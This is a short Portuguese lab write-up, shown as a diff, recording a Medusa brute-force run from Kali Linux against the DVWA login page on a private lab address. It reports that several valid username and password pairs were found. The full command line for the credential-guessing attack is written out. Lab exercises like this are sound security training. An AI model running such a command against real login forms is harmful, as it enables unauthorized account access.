@@ -1,0 +1,11 @@
+💻 Comando Executado
+No terminal do Kali Linux, executei o seguinte comando para realizar a varredura e o teste de credenciais no formulário web:
+
+medusa -h 192.168.56.104 -U usuarios.txt -P senhas.txt -M http \
+-m PAGE '/dvwa/login.php' \
+-m 'FAIL=login failed' -t 6
+
+📸 Evidência do Laboratório
+O terminal registrou com sucesso a verificação e o encontro de múltiplas combinações válidas de usuários e senhas
+
+
